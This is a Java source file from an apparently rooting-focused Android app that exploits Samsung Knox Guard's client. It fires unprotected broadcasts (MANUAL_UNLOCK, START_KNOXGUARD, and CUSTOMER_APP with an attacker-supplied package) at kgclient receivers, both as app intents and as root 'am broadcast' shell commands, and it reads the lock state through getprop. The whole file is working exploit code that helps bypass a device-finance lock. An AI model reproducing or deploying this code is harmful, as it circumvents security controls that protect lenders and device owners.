package df.root;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import java.io.BufferedReader;
import java.io.InputStreamReader;

/**
 * App-domain Knox Guard nudges found in the decompiled kgclient receivers.
 *
 * ServiceIntentReceiver handles MANUAL_UNLOCK without a caller check and
 * emits KNOXGUARD_UNLOCKED. KGKesReceiver handles START_KNOXGUARD and
 * KGIntentReceiver handles CUSTOMER_APP with an attacker-supplied package.
 *
 * START_KNOXGUARD is only sent while the device is NOT enrolled. x1.a.H()
 * in kgclient shows "Device has been enrolled. Can't enroll again." for
 * states Active(2), Locked(3) and Completed(4), so on an enrolled device
 * the nudge would only produce that toast. The HAL/Java unlock in Runner
 * is the primary path and runs regardless.
 */
final class KgBroadcast {

    private static final String TAG = "dfroot";
    private static final String CLIENT = "com.samsung.android.kgclient";
    private static final String CUSTOMER_PACKAGE = "df.root";
    private static final String START = "start";

    private static final String[][] NUDGES = {
            {
                    "unlock",
                    "com.samsung.kgclient.android.intent.action.MANUAL_UNLOCK",
                    ".receiver.ServiceIntentReceiver",
                    null,
            },
            {
                    START,
                    "com.sec.enterprise.knox.cloudmdm.smdms.intent.action.START_KNOXGUARD",
                    ".receiver.KGKesReceiver",
                    null,
            },
            {
                    "customer",
                    "com.samsung.kgclient.intent.action.CUSTOMER_APP",
                    ".receiver.KGIntentReceiver",
                    CUSTOMER_PACKAGE,
            },
    };

    private KgBroadcast() {
    }

    /** Fire the app-domain nudges at startup, before root exists. */
    static void appOnly(final Context ctx) {
        Thread t = new Thread(() -> {
            int state = state();
            Log.i(TAG, "[kg-broadcast] state=" + state
                    + (enrolled(state) ? " (already enrolled)" : ""));
            for (String[] nudge : NUDGES) {
                if (START.equals(nudge[0]) && enrolled(state)) {
                    Log.i(TAG, "[kg-broadcast] start skipped (already enrolled)");
                    continue;
                }
                Log.i(TAG, "[kg-broadcast] " + nudge[0]
                        + " app=" + appNudge(ctx, nudge[1], nudge[3]));
            }
        }, "dfroot-kg");
        t.setDaemon(true);
        t.start();
    }

    /** Returns lines ready for the run log; never throws. */
    static String apply(Context ctx) {
        int state = state();
        StringBuilder out = new StringBuilder();
        out.append("[kg-broadcast] state=").append(state)
                .append(enrolled(state) ? " (already enrolled)" : "").append('\n');
        for (String[] nudge : NUDGES) {
            String label = nudge[0];
            if (START.equals(label) && enrolled(state)) {
                out.append("[kg-broadcast] start skipped (already enrolled)\n");
                continue;
            }
            String action = nudge[1];
            String receiver = nudge[2];
            String extra = nudge[3];

            String app = appNudge(ctx, action, extra);
            String shell = "am broadcast --user 0 -a " + action
                    + " -p " + CLIENT + " -n " + CLIENT + "/" + receiver;
            if (extra != null) {
                shell += " --es customerPackageName " + extra;
            }
            String root = Runner.suScript(20L, shell);
            out.append("[kg-broadcast] ")
                    .append(label)
                    .append(" app=").append(app)
                    .append(" root=").append(oneLine(root))
                    .append('\n');
        }
        return out.toString();
    }

    private static String appNudge(Context ctx, String action, String extra) {
        try {
            Intent intent = new Intent(action).setPackage(CLIENT);
            if (extra != null) {
                intent.putExtra("customerPackageName", extra);
            }
            ctx.sendBroadcast(intent);
            return "sent";
        } catch (Throwable t) {
            Log.w(TAG, "kg broadcast " + action + ": " + t);
            return "blocked";
        }
    }

    /** 0=Prenormal, 1=Checking, 2=Active, 3=Locked, 4=Completed, 5=Error. */
    private static boolean enrolled(int state) {
        return state == 2 || state == 3 || state == 4;
    }

    /** Read knox.kg.state without hidden APIs, then fall back to root. */
    private static int state() {
        int value = parse(readProp());
        if (value < 0) {
            value = parse(oneLine(Runner.suScript(10L, "getprop knox.kg.state")));
        }
        return value;
    }

    private static String readProp() {
        Process process = null;
        try {
            process = new ProcessBuilder("getprop", "knox.kg.state")
                    .redirectErrorStream(true).start();
            BufferedReader reader = new BufferedReader(
                    new InputStreamReader(process.getInputStream()));
            String line = reader.readLine();
            reader.close();
            process.waitFor();
            return line;
        } catch (Throwable t) {
            return null;
        } finally {
            if (process != null) {
                process.destroy();
            }
        }
    }

    private static int parse(String value) {
        if (value == null) {
            return -1;
        }
        String flat = value.trim();
        try {
            return Integer.parseInt(flat);
        } catch (Throwable t) {
            return -1;
        }
    }

    private static String oneLine(String value) {
        if (value == null || value.trim().isEmpty()) {
            return "no-reply";
        }
        String flat = value.trim().replace('\n', ' ');
        return flat.length() > 140 ? flat.substring(0, 140) + "..." : flat;
    }
}
